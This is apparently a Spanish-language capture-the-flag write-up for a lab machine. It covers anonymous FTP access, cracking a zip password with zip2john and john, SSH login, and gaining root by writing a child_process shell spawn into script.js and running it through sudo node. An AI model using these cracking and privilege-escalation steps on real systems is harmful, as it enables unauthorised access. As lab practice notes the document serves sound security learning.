kali

Port: 21,22
- Cuando hacemos escaneo de puerto nos sale que podemos ingresar como anonymous por el puerto 21
![[Pasted image 20250303190308.png]]
- Si usamos el comando ls, encontramos el siguiente archivo.
![[Pasted image 20250303190338.png]]
- Vamos a descargarlo.
- Ya en nuestro poder vamos a descomprimirlo con el comando:
```
7z e (NOMBRE_DEL_.ZIP)
```
![[Pasted image 20250303190549.png]]
- Pero nos pide una contraseña, asi que tenemos que usar ==john==.
- Usamos el siguiente comando:
```
zip2john (NOMBRE_ARCHIVO) > (NUEVO_NOMBRE_.hash)
```
![[Pasted image 20250303190816.png]]
- Usamos ==john== para sacar la contraseña
```
john (NOMBRE_ARCHIVO)
```
![[Pasted image 20250303190855.png]]
- Ahora vamos a comprimir.
![[Pasted image 20250303190932.png]]
- Nos dio este .txt
![[Pasted image 20250303190954.png]]
- Vamos a usar estos datos para entrar por el puerto 22.
![[Pasted image 20250303191204.png]]
- Vamos a escalar privilegios.
![[Pasted image 20250303191752.png]]
- En el directorio de mario tenemos un archivo llamado script.js y en la pagina de binarios nos sale lo siguiente para el /bin/node.
![[Pasted image 20250303191832.png]]
- El archivo scriot.js esta basio, vamos a igresar el codigo de la pagina dentro de estre escript de esta forma
```
echo 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})' > script.js
```
- Para ejecutarlo usamos el comando que nos dio sudo -l:
```
sudo /usr/bin/node /home/mario/script.js
```
- Ya somos root.
![[Pasted image 20250303192255.png]]
